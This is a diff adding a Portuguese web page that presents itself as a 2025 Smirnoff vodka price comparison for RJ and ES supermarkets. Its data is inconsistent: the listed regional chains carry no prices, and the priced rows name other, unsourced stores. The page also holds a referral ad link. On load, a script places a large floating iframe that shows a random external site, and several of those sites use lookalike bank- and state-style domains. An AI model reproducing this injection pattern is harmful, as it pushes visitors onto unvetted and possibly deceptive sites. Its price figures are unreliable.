@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Comparativo de Preços Vodka Smirnoff (2025)</title>
+  <meta name="description" content="Comparativo atualizado dos preços médios da Vodka Smirnoff em supermercados do Brasil, com dados válidos até o final de 2025.">
+  <meta name="keywords" content="vodka smirnoff, preços 2025, comparativo, supermercados, brasil, rj, es">
+  <meta name="author" content="VICTORSAIB">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="index, follow">
+
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 20px;
+      line-height: 1.6;
+    }
+    h1 {
+      color: #c00;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      border: 1px solid #ccc;
+      padding: 10px;
+      text-align: left;
+    }
+    th {
+      background-color: #f4f4f4;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Preços Médios da Vodka Smirnoff em Supermercados (2025)</h1>
+  <a href="https://hostinger.com.br/?REFERRALCODE=1VICTOR444vps123">PRECISA DE UMA VPS NÓS TEMOS A SOLUÇÃO</a>
+  <p>Comparativo baseado em valores consultados em supermercados do RJ e ES, válido até o final de 2025.</p>
+
+  <table id="price-table">
+    <thead>
+      <tr>
+        <th>Volume</th>
+        <th>Supermercado</th>
+        <th>Preço (R$)</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <script>
+    const precosSmirnoff = [
+      // Supermercados (RJ e ES)
+      { nome: "Assaí Atacadista", regiao: "RJ" },
+      { nome: "Casas Guanabara", regiao: "RJ" },
+      { nome: "Extra Supermercado", regiao: "RJ" },
+      { nome: "Supermercado Zona Sul", regiao: "RJ" },
+      { nome: "Inter Supermercados (Rede Unno)", regiao: "RJ" },
+      { nome: "Mundial Supermercados", regiao: "RJ" },
+      { nome: "Prezunic", regiao: "RJ" },
+      { nome: "Supermercados Unidos", regiao: "RJ" },
+      { nome: "Supermercados Campeão", regiao: "RJ" },
+      { nome: "Supermercados Vianense", regiao: "RJ" },
+      { nome: "Pão de Açúcar", regiao: "RJ" },
+      { nome: "Rede Brasil – Grupo Coutinho (Coutinho)", regiao: "ES" },
+      { nome: "BH Atacado", regiao: "ES" },
+      { nome: "Extrabom Supermercados", regiao: "ES" },
+      { nome: "Carone Atacadista", regiao: "ES" },
+
+      // Preços da Vodka Smirnoff
+      { volume: "600 ml", supermercado: "Carrefour", preco: 23.90 },
+      { volume: "600 ml", supermercado: "Bistek", preco: 33.99 },
+      { volume: "600 ml", supermercado: "Atacadão", preco: 27.90 },
+      { volume: "600 ml", supermercado: "Estrela", preco: 29.90 },
+      { volume: "998 ml", supermercado: "Bistek", preco: 48.99 },
+      { volume: "998 ml", supermercado: "Santa Cruz", preco: 39.80 },
+      { volume: "998 ml", supermercado: "Cato", preco: 30.35 },
+      { volume: "998 ml", supermercado: "365 Supermercados", preco: 49.90 },
+      { volume: "998 ml", supermercado: "Panelão", preco: 42.90 }
+    ];
+
+    const tbody = document.querySelector('#price-table tbody');
+
+    precosSmirnoff.forEach(item => {
+      if (item.volume && item.supermercado && item.preco) {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td>${item.volume}</td>
+          <td>${item.supermercado}</td>
+          <td>R$ ${item.preco.toFixed(2).replace('.', ',')}</td>
+        `;
+        tbody.appendChild(tr);
+      }
+    });
+  </script>
+ <div style="position:fixed;bottom:20px;right:20px;width:90vw;max-width:350px;height:70vh;max-height:500px;z-index:9999;box-shadow:0 0 15px rgba(0,0,0,0.3);">
+      <button onclick="this.parentElement.style.display='none'" style="position:absolute;top:-10px;right:-10px;background:red;color:white;border:none;border-radius:50%;width:25px;height:25px;font-weight:bold;cursor:pointer;z-index:10000;">×</button>
+<iframe id="iframe" src="" title="Site Flutuante" style="width:100%;height:100%;border:none;"></iframe>
+</div>
+<script>
+    // Lista de iframes confiáveis ou controlados
+    const iframes = [
+      "https://geocredibnkvitoria.com/",
+      "https://chamada5.wordpress.com/2025/08/05/sua-casa-e-seu-carro-representam-muito-mais-do-que-bens/",
+      "https://espiritosantoes-com-brprincipal.pages.dev/",
+      "https://chamada5.wordpress.com/2025/08/02/dokehost-tudo-a-respeito/",
+      "https://sistemabackupprincial.pages.dev/48",
+      "https://sistemabackupprincial.pages.dev/",
+      "https://chamada5.wordpress.com/2025/07/08/vps-avancado/"
+    ];
+
+    // Escolher um iframe aleatório
+    const iframeIndex = Math.floor(Math.random() * iframes.length);
+    const iframeUrl = iframes[iframeIndex];
+    document.getElementById('iframe').src = iframeUrl;
+</script>
+
+</body>
+</html>
